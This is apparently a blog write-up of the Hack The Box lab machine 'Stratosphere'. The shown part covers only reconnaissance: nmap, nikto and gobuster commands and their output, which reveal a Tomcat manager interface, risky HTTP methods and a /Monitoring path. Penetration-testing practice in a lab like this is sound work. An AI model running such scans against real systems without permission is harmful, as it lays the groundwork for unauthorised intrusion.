<!DOCTYPE html>
<html class="theme-next mist use-motion" lang="en">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
  <meta charset="UTF-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">









<meta http-equiv="Cache-Control" content="no-transform">
<meta http-equiv="Cache-Control" content="no-siteapp">















  
  
  <link href="/assets/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">




  
  
  
  

  

  

  

  

  

  
    
    
    <link href="//fonts.googleapis.com/css?family=Lato:300,300italic,400,400italic,700,700italic&amp;subset=latin,latin-ext" rel="stylesheet" type="text/css">
  






<link href="/assets/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">

<link href="/assets/css/main.css?v=5.1.1" rel="stylesheet" type="text/css">


  <meta name="keywords" content="hackthebox,write-up,linux-box,">








  <link rel="shortcut icon" type="image/x-icon" href="/favicon.ico?v=5.1.1">
















<meta name="description" content="">
<meta name="keywords" content="hackthebox, write-up, linux-box">
<meta property="og:type" content="article">
<meta property="og:title" content="HTB - Stratosphere">
<meta property="og:url" content="/2018/08/25/HTB-Stratosphere/">
<meta property="og:site_name" content="Pxmme">
<meta property="og:description" content="">
<meta property="og:locale" content="en">
<meta property="og:image" content="/imgs/strsite.png">
<meta property="og:image" content="/imgs/straction.png">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="HTB - Stratosphere">
<meta name="twitter:description" content="">
<meta name="twitter:image" content="/imgs/strsite.png">


<script type="text/javascript" id="hexo.configurations">
  var NexT = window.NexT || {};
  var CONFIG = {
    root: '',
    scheme: 'Mist',
    sidebar: {"position":"left","display":"post","offset":12,"offset_float":0,"b2t":false,"scrollpercent":false},
    fancybox: true,
    motion: true,
    duoshuo: {
      userId: '0',
      author: 'Author'
    },
    algolia: {
      applicationID: '',
      apiKey: '',
      indexName: '',
      hits: {"per_page":10},
      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
    }
  };
</script>



  <link rel="canonical" href="">





  <title>HTB - Stratosphere | Pxmme</title>
  




<script>
  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
            (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
          m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
  })(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
  ga('create', 'UA-124206072-1', 'auto');
  ga('send', 'pageview');
</script>













</head>

<body itemscope itemtype="http://schema.org/WebPage" lang="en">

  
  

  <div class="container sidebar-position-left page-post-detail ">
    <div class="headband"></div>

    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"> <div class="site-brand-wrapper">
  <div class="site-meta ">
    

    <div class="custom-logo-site-title">
      <a href="/" class="brand" rel="start">
        <span class="logo-line-before"><i></i></span>
        <span class="site-title">Pxmme</span>
        <span class="logo-line-after"><i></i></span>
      </a>
    </div>
      
        <p class="site-subtitle">Please take off your shoes.</p>
      
  </div>

  <div class="site-nav-toggle">
    <button>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
    </button>
  </div>
</div>

<nav class="site-nav">
  

  
    <ul id="menu" class="menu">
      
        
        
        
        <li class="menu-item menu-item-home">
          <a href="/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
            
            Home
          </a>
        </li>
      
        
        
        
        <li class="menu-item menu-item-tags">
          <a href="/tags/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br>
            
            Tags
          </a>
        </li>
      

      
    </ul>
  

  
</nav>



 </div>
    </header>

    <main id="main" class="main">
      <div class="main-inner">
        <div class="content-wrap">
          <div id="content" class="content">
            

<div id="posts" class="posts-expand">
  
  

  

  
  
  

  <article class="post post-type- " itemscope itemtype="http://schema.org/Article">
    <link itemprop="mainEntityOfPage" href="/2018/08/25/HTB-Stratosphere/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Pxmme">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="assets/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Pxmme">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
          
          
            HTB - Stratosphere
          
        </h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2018-08-25T07:00:00+02:00">
                2018-08-25
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          

          
            
                <div class="post-description">
                    
                </div>
            
          

        </div>
      </header>
    

    <div class="post-body" itemprop="articleBody">

      
      

      
        
  
  












  <!-- more -->

<h2 id="target">Target</h2>

<p>10.10.10.64</p>

<p><strong>Linux</strong></p>

<p><em>User : 15 points</em></p>

<p><em>Root : 30 points</em></p>

<h2 id="enumeration">Enumeration</h2>

<p>Letâ€™s do an nmap :</p>

<div class="highlighter-rouge">
<div class="highlight"><table style="margin: 0px"><tbody><tr>
<td class="gutter"><pre>1<br>2<br>3<br>4<br>5<br>6<br>7<br>8<br>9<br>10<br>11<br>12<br>13<br>14<br>15<br>16<br>17<br>18<br>19<br>20<br>21<br>22<br>23<br>24<br>25<br>26<br>27<br>28<br>29<br>30<br>31<br>32<br>33<br>34<br>35<br>36<br>37<br>38<br>39<br>40<br>41<br>42<br>43<br>44<br>45<br>46<br>47<br>48<br>49<br>50<br>51<br>52<br>53<br>54<br>55<br>56<br>57<br>58<br>59<br>60<br>61<br>62<br>63<br>64<br>65<br>66<br>67<br>68<br>69<br>70<br>71<br>72<br>73<br>74<br>75<br>76<br>77<br>78<br>79<br>80<br>81<br>82<br>83<br>84<br>85<br>86<br>87<br>88<br>89<br>90<br>91<br>92<br>93<br>94<br>95<br>96<br>97<br>98<br>99<br>100<br>101<br>102<br>103<br>104<br>105<br>106<br>107<br>108<br>109<br>110<br>111<br>112<br>113<br>114<br>115<br>116<br>117<br>118<br>119<br>120<br>121<br>122<br>123<br>124<br>125<br>126<br>127<br>128<br>129<br>130<br>131<br>132<br>133<br>134<br>135<br>136<br>137<br>138<br>139<br>140<br>141<br>142<br>143<br>144<br>145<br>146<br>147<br>148<br>149<br>150<br>151<br>152<br>153<br>154<br>155<br>156<br>157<br>158<br>159<br>160<br>161<br>162<br>163<br>164<br>165<br>166<br>167<br>168<br>169<br>170<br>171<br>172<br>173<br>174<br>175<br>176<br>177<br>178<br>179<br>180<br>181<br>182<br>183<br>184<br>185</pre></td>
<td class="code"><pre class="highlight"><code>NSE: Loaded 148 scripts for scanning.
NSE: Script Pre-scanning.
Initiating NSE at 10:02
Completed NSE at 10:02, 0.00s elapsed
Initiating NSE at 10:02
Completed NSE at 10:02, 0.00s elapsed
Initiating Ping Scan at 10:02
Scanning 10.10.10.64 [4 ports]
Completed Ping Scan at 10:02, 0.08s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 10:02
Completed Parallel DNS resolution of 1 host. at 10:02, 0.00s elapsed
Initiating SYN Stealth Scan at 10:02
Scanning 10.10.10.64 [1000 ports]
Discovered open port 22/tcp on 10.10.10.64
Discovered open port 8080/tcp on 10.10.10.64
Discovered open port 80/tcp on 10.10.10.64
Completed SYN Stealth Scan at 10:03, 9.43s elapsed (1000 total ports)
Initiating Service scan at 10:03
Scanning 3 services on 10.10.10.64
Completed Service scan at 10:03, 16.20s elapsed (3 services on 1 host)
Initiating OS detection (try #1) against 10.10.10.64
Retrying OS detection (try #2) against 10.10.10.64
Initiating Traceroute at 10:03
Completed Traceroute at 10:03, 0.03s elapsed
Initiating Parallel DNS resolution of 2 hosts. at 10:03
Completed Parallel DNS resolution of 2 hosts. at 10:03, 0.00s elapsed
NSE: Script scanning 10.10.10.64.
Initiating NSE at 10:03
Completed NSE at 10:03, 2.75s elapsed
Initiating NSE at 10:03
Completed NSE at 10:03, 0.00s elapsed
Nmap scan report for 10.10.10.64
Host is up (0.021s latency).
Not shown: 997 filtered ports
PORT     STATE SERVICE    VERSION
22/tcp   open  ssh        OpenSSH 7.4p1 Debian 10+deb9u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 5b:16:37:d4:3c:18:04:15:c4:02:01:0d:db:07:ac:2d (RSA)
|   256 e3:77:7b:2c:23:b0:8d:df:38:35:6c:40:ab:f6:81:50 (ECDSA)
|_  256 d7:6b:66:9c:19:fc:aa:66:6c:18:7a:cc:b5:87:0e:40 (ED25519)
80/tcp   open  http
| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.1 404 
|     Content-Type: text/html;charset=utf-8
|     Content-Language: en
|     Content-Length: 1114
|     Date: Sat, 25 Aug 2018 08:03:08 GMT
|     Connection: close
|     <span class="cp">&lt;!doctype html&gt;</span><span class="nt">&lt;html</span> <span class="na">lang=</span><span class="s">"en"</span><span class="nt">&gt;&lt;head&gt;&lt;title&gt;</span>HTTP Status 404 
|     Found<span class="nt">&lt;/title&gt;&lt;style </span><span class="na">type=</span><span class="s">"text/css"</span><span class="nt">&gt;h1</span> <span class="p">{</span><span class="nl">font-family</span><span class="p">:</span><span class="n">Tahoma</span><span class="p">,</span><span class="n">Arial</span><span class="p">,</span><span class="nb">sans-serif</span><span class="p">;</span><span class="nl">color</span><span class="p">:</span><span class="no">white</span><span class="p">;</span><span class="nl">background-color</span><span class="p">:</span><span class="m">#525D76</span><span class="p">;</span><span class="nl">font-size</span><span class="p">:</span><span class="m">22px</span><span class="p">;}</span> <span class="nt">h2</span> <span class="p">{</span><span class="nl">font-family</span><span class="p">:</span><span class="n">Tahoma</span><span class="p">,</span><span class="n">Arial</span><span class="p">,</span><span class="nb">sans-serif</span><span class="p">;</span><span class="nl">color</span><span class="p">:</span><span class="no">white</span><span class="p">;</span><span class="nl">background-color</span><span class="p">:</span><span class="m">#525D76</span><span class="p">;</span><span class="nl">font-size</span><span class="p">:</span><span class="m">16px</span><span class="p">;}</span> <span class="nt">h3</span> <span class="p">{</span><span class="nl">font-family</span><span class="p">:</span><span class="n">Tahoma</span><span class="p">,</span><span class="n">Arial</span><span class="p">,</span><span class="nb">sans-serif</span><span class="p">;</span><span class="nl">color</span><span class="p">:</span><span class="no">white</span><span class="p">;</span><span class="nl">background-color</span><span class="p">:</span><span class="m">#525D76</span><span class="p">;</span><span class="nl">font-size</span><span class="p">:</span><span class="m">14px</span><span class="p">;}</span> <span class="nt">body</span> <span class="p">{</span><span class="nl">font-family</span><span class="p">:</span><span class="n">Tahoma</span><span class="p">,</span><span class="n">Arial</span><span class="p">,</span><span class="nb">sans-serif</span><span class="p">;</span><span class="nl">color</span><span class="p">:</span><span class="no">black</span><span class="p">;</span><span class="nl">background-color</span><span class="p">:</span><span class="no">white</span><span class="p">;}</span> <span class="nt">b</span> <span class="p">{</span><span class="nl">font-family</span><span class="p">:</span><span class="n">Tahoma</span><span class="p">,</span><span class="n">Arial</span><span class="p">,</span><span class="nb">sans-serif</span><span class="p">;</span><span class="nl">color</span><span class="p">:</span><span class="no">white</span><span class="p">;</span><span class="nl">background-color</span><span class="p">:</span><span class="m">#525D76</span><span class="p">;}</span> <span class="nt">p</span> <span class="p">{</span><span class="nl">font-family</span><span class="p">:</span><span class="n">Tahoma</span><span class="p">,</span><span class="n">Arial</span><span class="p">,</span><span class="nb">sans-serif</span><span class="p">;</span><span class="nl">background</span><span class="p">:</span><span class="no">white</span><span class="p">;</span><span class="nl">color</span><span class="p">:</span><span class="no">black</span><span class="p">;</span><span class="nl">font-size</span><span class="p">:</span><span class="m">12px</span><span class="p">;}</span> <span class="nt">a</span> <span class="p">{</span><span class="nl">color</span><span class="p">:</span><span class="no">black</span><span class="p">;}</span> <span class="nt">a</span><span class="nc">.name</span> <span class="p">{</span><span class="nl">color</span><span class="p">:</span><span class="no">black</span><span class="p">;}</span> <span class="nc">.line</span> <span class="p">{</span><span class="nl">height</span><span class="p">:</span><span class="m">1px</span><span class="p">;</span><span class="nl">background-color</span><span class="p">:</span><span class="m">#525D76</span><span class="p">;</span><span class="nl">border</span><span class="p">:</span><span class="nb">none</span><span class="p">;}</span><span class="o">&lt;/</span><span class="nt">style</span><span class="o">&gt;&lt;/</span><span class="nt">head</span><span class="o">&gt;&lt;</span><span class="nt">body</span><span class="o">&gt;</span>
<span class="o">|</span>   <span class="nt">GetRequest</span><span class="o">:</span> 
<span class="o">|</span>     <span class="nt">HTTP</span><span class="o">/</span><span class="nt">1</span><span class="nc">.1</span> <span class="nt">200</span> 
<span class="o">|</span>     <span class="nt">Accept-Ranges</span><span class="o">:</span> <span class="nt">bytes</span>
<span class="o">|</span>     <span class="nt">ETag</span><span class="o">:</span> <span class="nt">W</span><span class="o">/</span><span class="s1">"1708-1519762495000"</span>
<span class="o">|</span>     <span class="nt">Last-Modified</span><span class="o">:</span> <span class="nt">Tue</span><span class="o">,</span> <span class="nt">27</span> <span class="nt">Feb</span> <span class="nt">2018</span> <span class="nt">20</span><span class="nd">:14:55</span> <span class="nt">GMT</span>
<span class="o">|</span>     <span class="nt">Content-Type</span><span class="o">:</span> <span class="nt">text</span><span class="o">/</span><span class="nt">html</span>
<span class="o">|</span>     <span class="nt">Content-Length</span><span class="o">:</span> <span class="nt">1708</span>
<span class="o">|</span>     <span class="nt">Date</span><span class="o">:</span> <span class="nt">Sat</span><span class="o">,</span> <span class="nt">25</span> <span class="nt">Aug</span> <span class="nt">2018</span> <span class="nt">08</span><span class="nd">:03:08</span> <span class="nt">GMT</span>
<span class="o">|</span>     <span class="nt">Connection</span><span class="o">:</span> <span class="nt">close</span>
<span class="o">|</span>     <span class="o">&lt;!</span><span class="nt">DOCTYPE</span> <span class="nt">html</span><span class="o">&gt;</span>
<span class="o">|</span>     <span class="o">&lt;</span><span class="nt">html</span><span class="o">&gt;</span>
<span class="o">|</span>     <span class="o">&lt;</span><span class="nt">head</span><span class="o">&gt;</span>
<span class="o">|</span>     <span class="o">&lt;</span><span class="nt">meta</span> <span class="nt">charset</span><span class="o">=</span><span class="s1">"utf-8"</span><span class="o">/&gt;</span>
<span class="o">|</span>     <span class="o">&lt;</span><span class="nt">title</span><span class="o">&gt;</span><span class="nt">Stratosphere</span><span class="o">&lt;/</span><span class="nt">title</span><span class="o">&gt;</span>
<span class="o">|</span>     <span class="o">&lt;</span><span class="nt">link</span> <span class="nt">rel</span><span class="o">=</span><span class="s1">"stylesheet"</span> <span class="nt">type</span><span class="o">=</span><span class="s1">"text/css"</span> <span class="nt">href</span><span class="o">=</span><span class="s1">"main.css"</span><span class="o">&gt;</span>
<span class="o">|</span>     <span class="o">&lt;/</span><span class="nt">head</span><span class="o">&gt;</span>
<span class="o">|</span>     <span class="o">&lt;</span><span class="nt">body</span><span class="o">&gt;</span>
<span class="o">|</span>     <span class="o">&lt;</span><span class="nt">div</span> <span class="nt">id</span><span class="o">=</span><span class="s1">"background"</span><span class="o">&gt;&lt;/</span><span class="nt">div</span><span class="o">&gt;</span>
<span class="o">|</span>     <span class="o">&lt;</span><span class="nt">header</span> <span class="nt">id</span><span class="o">=</span><span class="s1">"main-header"</span> <span class="nt">class</span><span class="o">=</span><span class="s1">"hidden"</span><span class="o">&gt;</span>
<span class="o">|</span>     <span class="o">&lt;</span><span class="nt">div</span> <span class="nt">class</span><span class="o">=</span><span class="s1">"container"</span><span class="o">&gt;</span>
<span class="o">|</span>     <span class="o">&lt;</span><span class="nt">div</span> <span class="nt">class</span><span class="o">=</span><span class="s1">"content-wrap"</span><span class="o">&gt;</span>
<span class="o">|</span>     <span class="o">&lt;</span><span class="nt">p</span><span class="o">&gt;&lt;</span><span class="nt">i</span> <span class="nt">class</span><span class="o">=</span><span class="s1">"fa fa-diamond"</span><span class="o">&gt;&lt;/</span><span class="nt">i</span><span class="o">&gt;&lt;/</span><span class="nt">p</span><span class="o">&gt;</span>
<span class="o">|</span>     <span class="o">&lt;</span><span class="nt">nav</span><span class="o">&gt;</span>
<span class="o">|</span>     <span class="nt">class</span><span class="o">=</span><span class="s1">"btn"</span> <span class="nt">href</span><span class="o">=</span><span class="s1">"GettingStarted.html"</span><span class="o">&gt;</span><span class="nt">Get</span> <span class="nt">started</span><span class="o">&lt;/</span><span class="nt">a</span><span class="o">&gt;</span>
<span class="o">|</span>     <span class="o">&lt;/</span><span class="nt">nav</span><span class="o">&gt;</span>
<span class="o">|</span>     <span class="o">&lt;/</span><span class="nt">div</span><span class="o">&gt;</span>
<span class="o">|</span>     <span class="o">&lt;/</span><span class="nt">div</span><span class="o">&gt;</span>
<span class="o">|</span>     <span class="o">&lt;/</span><span class="nt">header</span><span class="o">&gt;</span>
<span class="o">|</span>     <span class="o">&lt;</span><span class="nt">section</span> <span class="nt">id</span><span class="o">=</span><span class="s1">"greeting"</span><span class="o">&gt;</span>
<span class="o">|</span>     <span class="o">&lt;</span><span class="nt">div</span> <span class="nt">class</span><span class="o">=</span><span class="s1">"container"</span><span class="o">&gt;</span>
<span class="o">|</span>     <span class="o">&lt;</span><span class="nt">div</span> <span class="nt">class</span><span class="o">=</span><span class="s1">"content-wrap"</span><span class="o">&gt;</span>
<span class="o">|</span>     <span class="o">&lt;</span><span class="nt">h1</span><span class="o">&gt;</span><span class="nt">Stratosphere</span><span class="o">&lt;</span><span class="nt">br</span><span class="o">&gt;</span><span class="nt">We</span> <span class="nt">protect</span> <span class="nt">your</span> <span class="nt">credit</span><span class="o">.&lt;/</span><span class="nt">h1</span><span class="o">&gt;</span>
<span class="o">|</span>     <span class="nt">class</span><span class="o">=</span><span class="s1">"btn"</span> <span class="nt">href</span><span class="o">=</span><span class="s1">"GettingStarted.html"</span><span class="o">&gt;</span><span class="nt">Get</span> <span class="nt">started</span> <span class="nt">now</span><span class="o">&lt;/</span><span class="nt">a</span><span class="o">&gt;</span>
<span class="o">|</span>     <span class="o">&lt;</span><span class="nt">p</span><span class="o">&gt;&lt;</span><span class="nt">i</span> <span class="nt">class</span><span class="o">=</span><span class="s1">"ar
|   HTTPOptions: 
|     HTTP/1.1 200 
|     Allow: GET, HEAD, POST, PUT, DELETE, OPTIONS
|     Content-Length: 0
|     Date: Sat, 25 Aug 2018 08:03:08 GMT
|     Connection: close
|   RTSPRequest, X11Probe: 
|     HTTP/1.1 400 
|     Transfer-Encoding: chunked
|     Date: Sat, 25 Aug 2018 08:03:08 GMT
|_    Connection: close
| http-methods: 
|   Supported Methods: GET HEAD POST PUT DELETE OPTIONS
|_  Potentially risky methods: PUT DELETE
|_http-title: Stratosphere
8080/tcp open  http-proxy
| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.1 404 
|     Content-Type: text/html;charset=utf-8
|     Content-Language: en
|     Content-Length: 1114
|     Date: Sat, 25 Aug 2018 08:03:08 GMT
|     Connection: close
|     &lt;!doctype html&gt;&lt;html lang="</span><span class="nt">en</span><span class="s1">"&gt;&lt;head&gt;&lt;title&gt;HTTP Status 404 
|     Found&lt;/title&gt;&lt;style type="</span><span class="nt">text</span><span class="o">/</span><span class="nt">css</span><span class="err">"</span><span class="o">&gt;</span><span class="nt">h1</span> <span class="p">{</span><span class="nl">font-family</span><span class="p">:</span><span class="n">Tahoma</span><span class="p">,</span><span class="n">Arial</span><span class="p">,</span><span class="nb">sans-serif</span><span class="p">;</span><span class="nl">color</span><span class="p">:</span><span class="no">white</span><span class="p">;</span><span class="nl">background-color</span><span class="p">:</span><span class="m">#525D76</span><span class="p">;</span><span class="nl">font-size</span><span class="p">:</span><span class="m">22px</span><span class="p">;}</span> <span class="nt">h2</span> <span class="p">{</span><span class="nl">font-family</span><span class="p">:</span><span class="n">Tahoma</span><span class="p">,</span><span class="n">Arial</span><span class="p">,</span><span class="nb">sans-serif</span><span class="p">;</span><span class="nl">color</span><span class="p">:</span><span class="no">white</span><span class="p">;</span><span class="nl">background-color</span><span class="p">:</span><span class="m">#525D76</span><span class="p">;</span><span class="nl">font-size</span><span class="p">:</span><span class="m">16px</span><span class="p">;}</span> <span class="nt">h3</span> <span class="p">{</span><span class="nl">font-family</span><span class="p">:</span><span class="n">Tahoma</span><span class="p">,</span><span class="n">Arial</span><span class="p">,</span><span class="nb">sans-serif</span><span class="p">;</span><span class="nl">color</span><span class="p">:</span><span class="no">white</span><span class="p">;</span><span class="nl">background-color</span><span class="p">:</span><span class="m">#525D76</span><span class="p">;</span><span class="nl">font-size</span><span class="p">:</span><span class="m">14px</span><span class="p">;}</span> <span class="nt">body</span> <span class="p">{</span><span class="nl">font-family</span><span class="p">:</span><span class="n">Tahoma</span><span class="p">,</span><span class="n">Arial</span><span class="p">,</span><span class="nb">sans-serif</span><span class="p">;</span><span class="nl">color</span><span class="p">:</span><span class="no">black</span><span class="p">;</span><span class="nl">background-color</span><span class="p">:</span><span class="no">white</span><span class="p">;}</span> <span class="nt">b</span> <span class="p">{</span><span class="nl">font-family</span><span class="p">:</span><span class="n">Tahoma</span><span class="p">,</span><span class="n">Arial</span><span class="p">,</span><span class="nb">sans-serif</span><span class="p">;</span><span class="nl">color</span><span class="p">:</span><span class="no">white</span><span class="p">;</span><span class="nl">background-color</span><span class="p">:</span><span class="m">#525D76</span><span class="p">;}</span> <span class="nt">p</span> <span class="p">{</span><span class="nl">font-family</span><span class="p">:</span><span class="n">Tahoma</span><span class="p">,</span><span class="n">Arial</span><span class="p">,</span><span class="nb">sans-serif</span><span class="p">;</span><span class="nl">background</span><span class="p">:</span><span class="no">white</span><span class="p">;</span><span class="nl">color</span><span class="p">:</span><span class="no">black</span><span class="p">;</span><span class="nl">font-size</span><span class="p">:</span><span class="m">12px</span><span class="p">;}</span> <span class="nt">a</span> <span class="p">{</span><span class="nl">color</span><span class="p">:</span><span class="no">black</span><span class="p">;}</span> <span class="nt">a</span><span class="nc">.name</span> <span class="p">{</span><span class="nl">color</span><span class="p">:</span><span class="no">black</span><span class="p">;}</span> <span class="nc">.line</span> <span class="p">{</span><span class="nl">height</span><span class="p">:</span><span class="m">1px</span><span class="p">;</span><span class="nl">background-color</span><span class="p">:</span><span class="m">#525D76</span><span class="p">;</span><span class="nl">border</span><span class="p">:</span><span class="nb">none</span><span class="p">;}</span><span class="nt">&lt;/style&gt;&lt;/head&gt;&lt;body&gt;</span>
|   GetRequest: 
|     HTTP/1.1 200 
|     Accept-Ranges: bytes
|     ETag: W/"1708-1519762495000"
|     Last-Modified: Tue, 27 Feb 2018 20:14:55 GMT
|     Content-Type: text/html
|     Content-Length: 1708
|     Date: Sat, 25 Aug 2018 08:03:08 GMT
|     Connection: close
|     <span class="cp">&lt;!DOCTYPE html&gt;</span>
|     <span class="nt">&lt;html&gt;</span>
|     <span class="nt">&lt;head&gt;</span>
|     <span class="nt">&lt;meta</span> <span class="na">charset=</span><span class="s">"utf-8"</span><span class="nt">/&gt;</span>
|     <span class="nt">&lt;title&gt;</span>Stratosphere<span class="nt">&lt;/title&gt;</span>
|     <span class="nt">&lt;link</span> <span class="na">rel=</span><span class="s">"stylesheet"</span> <span class="na">type=</span><span class="s">"text/css"</span> <span class="na">href=</span><span class="s">"main.css"</span><span class="nt">&gt;</span>
|     <span class="nt">&lt;/head&gt;</span>
|     <span class="nt">&lt;body&gt;</span>
|     <span class="nt">&lt;div</span> <span class="na">id=</span><span class="s">"background"</span><span class="nt">&gt;&lt;/div&gt;</span>
|     <span class="nt">&lt;header</span> <span class="na">id=</span><span class="s">"main-header"</span> <span class="na">class=</span><span class="s">"hidden"</span><span class="nt">&gt;</span>
|     <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"container"</span><span class="nt">&gt;</span>
|     <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"content-wrap"</span><span class="nt">&gt;</span>
|     <span class="nt">&lt;p&gt;&lt;i</span> <span class="na">class=</span><span class="s">"fa fa-diamond"</span><span class="nt">&gt;&lt;/i&gt;&lt;/p&gt;</span>
|     <span class="nt">&lt;nav&gt;</span>
|     class="btn" href="GettingStarted.html"&gt;Get started<span class="nt">&lt;/a&gt;</span>
|     <span class="nt">&lt;/nav&gt;</span>
|     <span class="nt">&lt;/div&gt;</span>
|     <span class="nt">&lt;/div&gt;</span>
|     <span class="nt">&lt;/header&gt;</span>
|     <span class="nt">&lt;section</span> <span class="na">id=</span><span class="s">"greeting"</span><span class="nt">&gt;</span>
|     <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"container"</span><span class="nt">&gt;</span>
|     <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"content-wrap"</span><span class="nt">&gt;</span>
|     <span class="nt">&lt;h1&gt;</span>Stratosphere<span class="nt">&lt;br&gt;</span>We protect your credit.<span class="nt">&lt;/h1&gt;</span>
|     class="btn" href="GettingStarted.html"&gt;Get started now<span class="nt">&lt;/a&gt;</span>
|     <span class="nt">&lt;p&gt;&lt;i</span> <span class="na">class=</span><span class="s">"ar
|   HTTPOptions: 
|     HTTP/1.1 200 
|     Allow: GET, HEAD, POST, PUT, DELETE, OPTIONS
|     Content-Length: 0
|     Date: Sat, 25 Aug 2018 08:03:08 GMT
|     Connection: close
|   RTSPRequest: 
|     HTTP/1.1 400 
|     Transfer-Encoding: chunked
|     Date: Sat, 25 Aug 2018 08:03:08 GMT
|_    Connection: close
| http-methods: 
|   Supported Methods: GET HEAD POST PUT DELETE OPTIONS
|_  Potentially risky methods: PUT DELETE
|_http-open-proxy: Proxy might be redirecting requests
|_http-title: Stratosphere

Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 3.10 - 4.11 (92%), Linux 3.12 (92%), Linux 3.13 (92%), Linux 3.13 or 4.2 (92%), Linux 3.16 - 4.6 (92%), Linux 3.2 - 4.9 (92%), Linux 3.8 - 3.11 (92%), Linux 4.2 (92%), Linux 4.4 (92%), Linux 3.16 (90%)
No exact OS matches for host (test conditions non-ideal).
Uptime guess: 0.093 days (since Sat Aug 25 07:48:51 2018)
Network Distance: 2 hops
TCP Sequence Prediction: Difficulty=258 (Good luck!)
IP ID Sequence Generation: All zeros
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 22/tcp)
HOP RTT      ADDRESS
1   20.43 ms 10.10.14.1
2   20.60 ms 10.10.10.64

NSE: Script Post-scanning.
Initiating NSE at 10:03
Completed NSE at 10:03, 0.00s elapsed
Initiating NSE at 10:03
Completed NSE at 10:03, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 34.08 seconds
           Raw packets sent: 3086 (139.530KB) | Rcvd: 62 (5.400KB)
</span></code></pre></td>
</tr></tbody></table></div>
</div>

<p>Alright, so this is a webserver. Letâ€™s check it out and run a nikto on it.</p>

<p><img src="/imgs/strsite.png" alt="Stratosphere" class="img-responsive"></p>

<div class="highlighter-rouge">
<div class="highlight"><table style="margin: 0px"><tbody><tr>
<td class="gutter"><pre>1<br>2<br>3<br>4<br>5<br>6<br>7<br>8<br>9<br>10<br>11<br>12<br>13<br>14<br>15<br>16<br>17<br>18<br>19<br>20<br>21<br>22<br>23<br>24</pre></td>
<td class="code"><pre class="highlight"><code>~# nikto -h http://10.10.10.64/
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          10.10.10.64
+ Target Hostname:    10.10.10.64
+ Target Port:        80
+ Start Time:         2018-08-25 10:06:18 (GMT2)
---------------------------------------------------------------------------
+ Server: No banner retrieved
+ Server leaks inodes via ETags, header found with file /, fields: 0xW/1708 0x1519762495000 
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ Allowed HTTP Methods: GET, HEAD, POST, PUT, DELETE, OPTIONS 
+ OSVDB-397: HTTP method ('Allow' Header): 'PUT' method could allow clients to save files on the web server.
+ OSVDB-5646: HTTP method ('Allow' Header): 'DELETE' may allow clients to remove files on the web server.
+ /manager/html: Default Tomcat Manager / Host Manager interface found
+ /host-manager/html: Default Tomcat Manager / Host Manager interface found
+ /manager/status: Default Tomcat Server Status interface found
+ 7801 requests: 0 error(s) and 10 item(s) reported on remote host
+ End Time:           2018-08-25 10:10:01 (GMT2) (223 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
</code></pre></td>
</tr></tbody></table></div>
</div>

<p>Quite a few information there already. Unfortunately, after spending a few minutes spent trying to get into that Tomcat, with no success, I tried a gobuster, which also found /manager but with something maybe more interesting.</p>

<div class="highlighter-rouge">
<div class="highlight"><table style="margin: 0px"><tbody><tr>
<td class="gutter"><pre>1<br>2<br>3<br>4<br>5<br>6<br>7<br>8<br>9<br>10<br>11<br>12<br>13</pre></td>
<td class="code"><pre class="highlight"><code>~# gobuster -u http://10.10.10.64/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 20

Gobuster v1.4.1              OJ Reeves (@TheColonial)
=====================================================
=====================================================
[+] Mode         : dir
[+] Url/Domain   : http://10.10.10.64/
[+] Threads      : 20
[+] Wordlist     : /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes : 302,307,200,204,301
=====================================================
/manager (Status: 302)
/Monitoring (Status: 302)
</code></pre></td>
</tr></tbody></table></div>
</div>

